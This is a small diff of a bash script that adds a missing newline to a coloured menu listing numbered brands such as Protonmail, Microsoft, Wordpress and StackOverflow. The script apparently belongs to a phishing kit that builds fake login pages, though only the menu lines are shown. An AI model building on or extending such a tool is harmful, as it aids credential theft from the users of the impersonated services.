@@ -59,7 +59,7 @@ printf "\e[1;92m[\e[0m\e[1;77m14\e[0m\e[1;92m]\e[0m\e[1;96m Protonmail\e[0m     
 
 printf "\e[1;92m[\e[0m\e[1;77m15\e[0m\e[1;92m]\e[0m\e[1;96m Wordpress\e[0m      \e[1;92m[\e[0m\e[1;77m31\e[0m\e[1;92m]\e[0m\e[1;96m Yandex   \e[0m        \e[1;92m[\e[0m\e[1;77m47\e[0m\e[1;92m]\e[0m\e[1;96m Pornhub\e[0m       \n"
 
-printf "\e[1;92m[\e[0m\e[1;77m16\e[0m\e[1;92m]\e[0m\e[1;96m Microsoft\e[0m      \e[1;92m[\e[0m\e[1;77m32\e[0m\e[1;92m]\e[0m\e[1;96m devianART   \e[0m     \e[1;92m[\e[0m\e[1;77m48\e[0m\e[1;92m]\e[0m\e[1;96m Xvideos\e[0m"
+printf "\e[1;92m[\e[0m\e[1;77m16\e[0m\e[1;92m]\e[0m\e[1;96m Microsoft\e[0m      \e[1;92m[\e[0m\e[1;77m32\e[0m\e[1;92m]\e[0m\e[1;96m devianART   \e[0m     \e[1;92m[\e[0m\e[1;77m48\e[0m\e[1;92m]\e[0m\e[1;96m Xvideos\e[0m\n"
 
 printf "\e[1;92m[\e[0m\e[1;77m17\e[0m\e[1;92m]\e[0m\e[1;96m IGFollowers\e[0m    \e[1;92m[\e[0m\e[1;77m33\e[0m\e[1;92m]\e[0m\e[1;96m StackOverflow\e[0m    \e[1;92m[\e[0m\e[1;77m49\e[0m\e[1;92m]\e[0m\e[1;96m Cod-Mobile\e[0m\n"
 
